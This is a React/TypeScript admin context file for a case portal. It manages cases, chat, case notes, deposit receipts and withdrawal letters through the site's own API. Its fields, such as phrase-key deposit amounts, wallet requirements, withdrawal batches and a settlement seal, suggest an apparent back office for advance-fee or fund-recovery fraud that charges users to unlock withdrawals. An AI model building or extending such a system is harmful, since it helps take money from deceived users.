import React, { createContext, useContext, useState, useRef, useMemo, ReactNode, useEffect, useCallback } from "react";
import { useTranslation } from "react-i18next";
import { useToast } from "@/hooks/use-toast";
import { useTheme } from "@/App";

export interface AdminData {
  vipStatus: string;
  username: string;
  withdrawalAmount: string;
  withdrawalBatches: string;
  physilocal0: string;
}

export interface Case {
  id: string;
  accessCode: string;
  caseRef?: string | null;
  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
  userName?: string;
  userEmail?: string;
  userMobile?: string;
  vipStatus?: string;
  username?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  physilocal0?: string;
  depositAddress?: string;
  profileRedirectUrl?: string;
  hasRequirements?: boolean;
  letterSent?: boolean;
  landingPage?: string;
  priority?: string;
  assignedTo?: string;
  tags?: string;
  internalNotes?: string;
  showWithdrawalProgress?: boolean;
  withdrawalStage?: string;
  activityDepositAmount?: string;
  phraseKeyDepositAmount?: string;
  phraseKeyMergeDeposit?: string;
  activityWalletRequirement?: string;
  phraseKeyCertificateSent?: boolean;
  submissionUrl?: string;
  createdAt: string;
  updatedAt: string;
  // Sealed Settlement & NDA — when set, the case is permanently locked.
  // PATCH /api/cases/:id returns 423 until cleared via Override Seal.
  sealedAt?: string | null;
  sealedBy?: string | null;
  // Preferred locale for transactional emails (BCP-47 base: en/es/fr/de/pt/zh).
  // Set by the portal on language switch and by admins via PATCH /api/cases/:id;
  // consumed by `resolveRecipientLocale` so admin-triggered sends reach the
  // user in their language even though the request comes from the admin.
  preferredLocale?: string | null;
}

export interface AdminMessage {
  id: number;
  caseId: string;
  category: 'urgent' | 'processing' | 'resolved';
  title: string;
  body: string;
  isRead: boolean;
  createdAt: string;
}

export interface DepositReceipt {
  id: number;
  caseId: string;
  imageData: string;
  fileName?: string;
  notes?: string;
  status: 'pending' | 'approved' | 'rejected';
  adminNotes?: string;
  uploadedAt: string;
}

export interface CaseLetter {
  id: number;
  caseId: string;
  headline?: string;
  introduction?: string;
  bodyContent?: string;
  footerNote?: string;
  complianceReference?: string;
  optionATitle?: string;
  optionADescription?: string;
  optionAAmount?: string;
  optionAFrequency?: string;
  optionABatches?: string;
  optionAKeyCost?: string;
  optionATotalRequirement?: string;
  optionATotalAmount?: string;
  optionAFilelocoId?: string;
  optionBTitle?: string;
  optionBDescription?: string;
  optionBAmount?: string;
  optionBFrequency?: string;
  optionBBatches?: string;
  optionBKeyCost?: string;
  optionBTotalRequirement?: string;
  optionBTotalAmount?: string;
  optionBFilelocoId?: string;
  phraseKeyRequirements?: string;
  complianceNotice?: string;
  scheduledFor?: string;
  expiresAt?: string;
}

export interface Submission {
  id: number;
  caseId: string;
  selectedOption: string;
  notes?: string;
  userName?: string;
  userEmail?: string;
  withdrawalAmount?: string;
  withdrawalBatches?: string;
  submittedAt: string;
}

export interface ChatMessage {
  id: number;
  caseId: string;
  sender: 'admin' | 'user';
  message: string;
  isRead: string;
  createdAt: string;
}

export interface ChatTemplate {
  id: number;
  name: string;
  content: string;
  category?: string;
  shortcut?: string;
  usageCount?: string;
  isActive: boolean;
  createdAt: string;
}

export interface CaseNote {
  id: number;
  caseId: string;
  content: string;
  adminUsername: string;
  isPinned: boolean;
  createdAt: string;
}

export interface AuditLog {
  id: number;
  adminUsername: string;
  action: string;
  resourceType: string;
  resourceId?: string;
  description: string;
  ipAddress?: string;
  userAgent?: string;
  newValue?: string | null;
  oldValue?: string | null;
  createdAt: string;
}

export interface AdminSession {
  id: string;
  adminUsername: string;
  token: string;
  ipAddress?: string;
  userAgent?: string;
  location?: string;
  isActive: boolean;
  lastActivityAt: string;
  createdAt: string;
  expiresAt: string;
  revokedAt?: string;
  revokedReason?: string;
}

export interface Notification {
  id: number;
  recipientType: string;
  recipientId?: string;
  type: string;
  title: string;
  body?: string;
  link?: string;
  isRead: boolean;
  createdAt: string;
}

export interface ScheduledMessage {
  id: number;
  caseId?: string;
  messageType: string;
  category?: string;
  title?: string;
  content: string;
  status: string;
  scheduledFor: string;
  createdBy?: string;
  createdAt: string;
}

export interface MessageTemplate {
  id: number;
  name: string;
  content: string;
  category?: string;
  isActive: boolean;
  usageCount?: string;
  createdBy?: string;
  createdAt: string;
}

export interface HelpArticle {
  id: number;
  title: string;
  content: string;
  category?: string;
  order?: string;
  isPublished: boolean;
  createdAt: string;
}

export interface UserFeedback {
  id: number;
  caseId: string;
  rating: string;
  comment?: string;
  feedbackType?: string;
  createdAt: string;
}

export interface DocumentRequest {
  id: number;
  caseId: string;
  documentType: string;
  description?: string;
  status: string;
  deadline?: string;
  submittedFileData?: string;
  submittedFileName?: string;
  adminNotes?: string;
  createdAt: string;
}

export type SettingsView = 'main' | 'audit' | 'sessions' | 'scheduled' | 'templates' | 'help' | 'feedback' | 'documents' | '2fa' | 'admin-users' | 'user-sessions' | 'translations' | 'sound' | 'sub-2fa';

export const playNotificationSound = (
  type: import('@/hooks/useNotificationSound').NotificationSoundType = 'alert',
): Promise<void> => {
  return import('@/hooks/useNotificationSound').then(m => m.playNotificationSound(type));
};

interface AdminContextType {
  authToken: string | null;
  setAuthToken: (token: string | null) => void;
  cases: Case[];
  setCases: (cases: Case[]) => void;
  allSubmissions: Submission[];
  setAllSubmissions: (submissions: Submission[]) => void;
  isDataLoading: boolean;
  setIsDataLoading: (loading: boolean) => void;
  selectedCase: Case | null;
  setSelectedCase: (c: Case | null) => void;
  filteredCases: Case[];
  searchQuery: string;
  setSearchQuery: (query: string) => void;
  statusFilter: string;
  setStatusFilter: (filter: string) => void;
  chatCase: Case | null;
  setChatCase: (c: Case | null) => void;
  chatMessages: ChatMessage[];
  setChatMessages: (messages: ChatMessage[]) => void;
  unreadCounts: Record<string, number>;
  setUnreadCounts: (counts: Record<string, number>) => void;
  totalUnread: number;
  setTotalUnread: (count: number) => void;
  adminMessages: AdminMessage[];
  setAdminMessages: (messages: AdminMessage[]) => void;
  depositReceipts: DepositReceipt[];
  setDepositReceipts: (receipts: DepositReceipt[]) => void;
  chatTemplates: ChatTemplate[];
  setChatTemplates: (templates: ChatTemplate[]) => void;
  caseNotes: CaseNote[];
  setCaseNotes: (notes: CaseNote[]) => void;
  auditLogs: AuditLog[];
  setAuditLogs: (logs: AuditLog[]) => void;
  adminSessions: AdminSession[];
  setAdminSessions: (sessions: AdminSession[]) => void;
  notifications: Notification[];
  setNotifications: (notifications: Notification[]) => void;
  unreadNotifications: number;
  setUnreadNotifications: (count: number) => void;
  scheduledMessages: ScheduledMessage[];
  setScheduledMessages: (messages: ScheduledMessage[]) => void;
  messageTemplates: MessageTemplate[];
  setMessageTemplates: (templates: MessageTemplate[]) => void;
  helpArticles: HelpArticle[];
  setHelpArticles: (articles: HelpArticle[]) => void;
  userFeedback: UserFeedback[];
  setUserFeedback: (feedback: UserFeedback[]) => void;
  documentRequests: DocumentRequest[];
  setDocumentRequests: (requests: DocumentRequest[]) => void;
  adminUsers: any[];
  setAdminUsers: (users: any[]) => void;
  userSessions: any[];
  setUserSessions: (sessions: any[]) => void;
  translations: {id: number; key: string; value: string; locale: string}[];
  setTranslations: (translations: {id: number; key: string; value: string; locale: string}[]) => void;
  settingsView: SettingsView;
  setSettingsView: (view: SettingsView) => void;
  lastMessageCountRef: React.MutableRefObject<Record<string, number>>;
  isInitialLoadRef: React.MutableRefObject<boolean>;
  lastRegisteredCountRef: React.MutableRefObject<number>;
  lastSubmissionsCountRef: React.MutableRefObject<number>;
  isInitialDataLoadRef: React.MutableRefObject<boolean>;
  toast: ReturnType<typeof useToast>['toast'];
  theme: string;
  toggleTheme: () => void;
  loadData: (showToast?: boolean) => Promise<void>;
  loadChatTemplates: () => Promise<void>;
  loadChatMessages: (caseId: string) => Promise<void>;
  sendChatMessage: (caseId: string, message: string) => Promise<void>;
  loadCaseNotes: (caseId: string) => Promise<void>;
  createCaseNote: (caseId: string, content: string) => Promise<void>;
  deleteCaseNote: (noteId: number, caseId: string) => Promise<void>;
  toggleNotePin: (noteId: number, caseId: string) => Promise<void>;
  createChatTemplate: (template: { name: string; content: string; category?: string }) => Promise<void>;
  deleteChatTemplate: (id: number) => Promise<void>;
}

const AdminContext = createContext<AdminContextType | null>(null);

export function useAdmin() {
  const context = useContext(AdminContext);
  if (!context) {
    throw new Error('useAdmin must be used within an AdminProvider');
  }
  return context;
}

interface AdminProviderProps {
  children: ReactNode;
  authToken: string | null;
  setAuthToken: (token: string | null) => void;
}

export function AdminProvider({ children, authToken, setAuthToken }: AdminProviderProps) {
  const [cases, setCases] = useState<Case[]>([]);
  const [allSubmissions, setAllSubmissions] = useState<Submission[]>([]);
  const [isDataLoading, setIsDataLoading] = useState(true);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  
  const [chatCase, setChatCase] = useState<Case | null>(null);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [unreadCounts, setUnreadCounts] = useState<Record<string, number>>({});
  const [totalUnread, setTotalUnread] = useState(0);
  
  const [adminMessages, setAdminMessages] = useState<AdminMessage[]>([]);
  const [depositReceipts, setDepositReceipts] = useState<DepositReceipt[]>([]);
  
  const [searchQuery, setSearchQuery] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  
  const [chatTemplates, setChatTemplates] = useState<ChatTemplate[]>([]);
  const [caseNotes, setCaseNotes] = useState<CaseNote[]>([]);
  
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>([]);
  const [adminSessions, setAdminSessions] = useState<AdminSession[]>([]);
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [unreadNotifications, setUnreadNotifications] = useState(0);
  const [scheduledMessages, setScheduledMessages] = useState<ScheduledMessage[]>([]);
  const [messageTemplates, setMessageTemplates] = useState<MessageTemplate[]>([]);
  const [helpArticles, setHelpArticles] = useState<HelpArticle[]>([]);
  const [adminUsers, setAdminUsers] = useState<any[]>([]);
  const [userSessions, setUserSessions] = useState<any[]>([]);
  const [userFeedback, setUserFeedback] = useState<UserFeedback[]>([]);
  const [documentRequests, setDocumentRequests] = useState<DocumentRequest[]>([]);
  const [translations, setTranslations] = useState<{id: number; key: string; value: string; locale: string}[]>([]);
  
  const [settingsView, setSettingsView] = useState<SettingsView>('main');
  
  const lastMessageCountRef = useRef<Record<string, number>>({});
  const isInitialLoadRef = useRef(true);
  const lastRegisteredCountRef = useRef(0);
  const lastSubmissionsCountRef = useRef(0);
  const isInitialDataLoadRef = useRef(true);
  
  const { toast } = useToast();
  const { theme, toggleTheme } = useTheme();
  const { t } = useTranslation("admin");
  
  const filteredCases = useMemo(() => {
    return cases.filter(c => {
      const matchesSearch = searchQuery === "" || 
        c.accessCode?.toLowerCase().includes(searchQuery.toLowerCase()) ||
        c.userName?.toLowerCase().includes(searchQuery.toLowerCase()) ||
        c.userEmail?.toLowerCase().includes(searchQuery.toLowerCase());
      
      const matchesStatus = statusFilter === "all" || c.status === statusFilter;
      
      return matchesSearch && matchesStatus;
    });
  }, [cases, searchQuery, statusFilter]);

  const loadData = useCallback(async (showToast = false) => {
    try {
      const token = authToken || sessionStorage.getItem('adminToken');
      const headers = { 'Authorization': `Bearer ${token}` };
      const [casesRes, submissionsRes] = await Promise.all([
        fetch('/api/cases', { headers }),
        fetch('/api/submissions', { headers })
      ]);
      
      if (casesRes.ok) {
        const data = await casesRes.json();
        const registeredCases = data.filter((c: Case) => c.status !== 'created');
        const currentRegisteredCount = registeredCases.length;
        
        if (!isInitialDataLoadRef.current && currentRegisteredCount > lastRegisteredCountRef.current) {
          const newCount = currentRegisteredCount - lastRegisteredCountRef.current;
          const newCase = registeredCases[registeredCases.length - 1];
          playNotificationSound();
          toast({
            title: t("toasts.newUserRegistered.title"),
            description: newCount > 1
              ? t("toasts.newUserRegisteredMulti.description", { name: newCase?.userName || t("toasts.aUser", { defaultValue: "A user" }), count: newCount })
              : t("toasts.newUserRegistered.description", { name: newCase?.userName || t("toasts.aUser", { defaultValue: "A user" }) })
          });
        }
        lastRegisteredCountRef.current = currentRegisteredCount;
        setCases(data);
      }
      
      if (submissionsRes.ok) {
        const data = await submissionsRes.json();
        const currentSubmissionsCount = data.length;
        
        if (!isInitialDataLoadRef.current && currentSubmissionsCount > lastSubmissionsCountRef.current) {
          const newCount = currentSubmissionsCount - lastSubmissionsCountRef.current;
          const newSubmission = data[data.length - 1];
          playNotificationSound();
          toast({
            title: t("toasts.newSubmission.title"),
            description: newCount > 1
              ? t("toasts.newSubmissionMulti.description", { option: newSubmission?.selectedOption || '', count: newCount })
              : t("toasts.newSubmission.description", { option: newSubmission?.selectedOption || '' })
          });
        }
        lastSubmissionsCountRef.current = currentSubmissionsCount;
        setAllSubmissions(data);
      }
      
      if (isInitialDataLoadRef.current) {
        isInitialDataLoadRef.current = false;
      }
      
      if (showToast) {
        toast({ title: t("toasts.refreshed.title"), description: t("toasts.refreshed.description") });
      }
    } catch (_e) {
      if (showToast) {
        toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.refreshFailed.description") });
      }
    } finally {
      setIsDataLoading(false);
    }
  }, [toast, authToken, t]);

  const loadChatTemplates = useCallback(async () => {
    try {
      const res = await fetch('/api/chat-templates', {
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      if (res.ok) {
        const templates = await res.json();
        setChatTemplates(templates);
      }
    } catch (error) {
      console.error('Failed to load chat templates:', error);
    }
  }, [authToken]);

  const loadChatMessages = useCallback(async (caseId: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/chat`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      if (res.ok) {
        const messages = await res.json();
        setChatMessages(messages);
        
        const currentCount = messages.length;
        const prevCount = lastMessageCountRef.current[caseId] || 0;
        
        if (!isInitialLoadRef.current && currentCount > prevCount) {
          const latestMessage = messages[messages.length - 1];
          if (latestMessage?.sender === 'user') {
            playNotificationSound();
            toast({
              title: t("toasts.newMessageNotify.title"),
              description: t("toasts.newMessageGeneric.description")
            });
          }
        }
        
        lastMessageCountRef.current[caseId] = currentCount;
        if (isInitialLoadRef.current) {
          isInitialLoadRef.current = false;
        }
      }
    } catch (error) {
      console.error('Failed to load chat messages:', error);
    }
  }, [toast, authToken, t]);

  const sendChatMessage = useCallback(async (caseId: string, message: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/chat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({ sender: 'admin', message })
      });
      if (res.ok) {
        await loadChatMessages(caseId);
      }
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.sendMessageFailed.description") });
    }
  }, [loadChatMessages, toast, authToken, t]);

  const loadCaseNotes = useCallback(async (caseId: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/notes`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      if (res.ok) {
        const notes = await res.json();
        setCaseNotes(notes);
      }
    } catch (error) {
      console.error('Failed to load case notes:', error);
    }
  }, [authToken]);

  const createCaseNote = useCallback(async (caseId: string, content: string) => {
    try {
      const res = await fetch(`/api/cases/${caseId}/notes`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${authToken}`
        },
        body: JSON.stringify({ content, adminUsername: 'Admin2025' })
      });
      if (res.ok) {
        toast({ title: t("toasts.noteAdded.title"), description: t("toasts.noteAdded.description") });
        await loadCaseNotes(caseId);
      }
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.noteAddFailed.description") });
    }
  }, [authToken, loadCaseNotes, toast, t]);

  const deleteCaseNote = useCallback(async (noteId: number, caseId: string) => {
    try {
      await fetch(`/api/case-notes/${noteId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      toast({ title: t("toasts.deleted.title"), description: t("toasts.noteRemoved.description") });
      await loadCaseNotes(caseId);
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.noteDeleteFailed.description") });
    }
  }, [authToken, loadCaseNotes, toast, t]);

  const toggleNotePin = useCallback(async (noteId: number, caseId: string) => {
    try {
      await fetch(`/api/case-notes/${noteId}/toggle-pin`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      await loadCaseNotes(caseId);
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.togglePinFailed.description") });
    }
  }, [authToken, loadCaseNotes, toast, t]);

  const createChatTemplate = useCallback(async (template: { name: string; content: string; category?: string }) => {
    if (!template.name.trim() || !template.content.trim()) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.templateNameRequired.description") });
      return;
    }
    try {
      const res = await fetch('/api/chat-templates', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${authToken}`
        },
        body: JSON.stringify(template)
      });
      if (res.ok) {
        toast({ title: t("toasts.templateCreated.title"), description: t("toasts.templateCreated.description") });
        await loadChatTemplates();
      }
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.templateCreateFailed.description") });
    }
  }, [authToken, loadChatTemplates, toast, t]);

  const deleteChatTemplate = useCallback(async (id: number) => {
    try {
      await fetch(`/api/chat-templates/${id}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      toast({ title: t("toasts.deleted.title"), description: t("toasts.templateRemoved.description") });
      await loadChatTemplates();
    } catch (_e) {
      toast({ variant: "destructive", title: t("toasts.errorTitle"), description: t("toasts.templateDeleteFailed.description") });
    }
  }, [authToken, loadChatTemplates, toast, t]);

  useEffect(() => {
    if (authToken) {
      loadData();
      loadChatTemplates();
      const interval = setInterval(() => loadData(), 3000);
      return () => clearInterval(interval);
    }
  }, [authToken, loadData, loadChatTemplates]);
  
  const value: AdminContextType = {
    authToken,
    setAuthToken,
    cases,
    setCases,
    allSubmissions,
    setAllSubmissions,
    isDataLoading,
    setIsDataLoading,
    selectedCase,
    setSelectedCase,
    filteredCases,
    searchQuery,
    setSearchQuery,
    statusFilter,
    setStatusFilter,
    chatCase,
    setChatCase,
    chatMessages,
    setChatMessages,
    unreadCounts,
    setUnreadCounts,
    totalUnread,
    setTotalUnread,
    adminMessages,
    setAdminMessages,
    depositReceipts,
    setDepositReceipts,
    chatTemplates,
    setChatTemplates,
    caseNotes,
    setCaseNotes,
    auditLogs,
    setAuditLogs,
    adminSessions,
    setAdminSessions,
    notifications,
    setNotifications,
    unreadNotifications,
    setUnreadNotifications,
    scheduledMessages,
    setScheduledMessages,
    messageTemplates,
    setMessageTemplates,
    helpArticles,
    setHelpArticles,
    userFeedback,
    setUserFeedback,
    documentRequests,
    setDocumentRequests,
    adminUsers,
    setAdminUsers,
    userSessions,
    setUserSessions,
    translations,
    setTranslations,
    settingsView,
    setSettingsView,
    lastMessageCountRef,
    isInitialLoadRef,
    lastRegisteredCountRef,
    lastSubmissionsCountRef,
    isInitialDataLoadRef,
    toast,
    theme,
    toggleTheme,
    loadData,
    loadChatTemplates,
    loadChatMessages,
    sendChatMessage,
    loadCaseNotes,
    createCaseNote,
    deleteCaseNote,
    toggleNotePin,
    createChatTemplate,
    deleteChatTemplate,
  };
  
  return (
    <AdminContext.Provider value={value}>
      {children}
    </AdminContext.Provider>
  );
}

export default AdminContext;
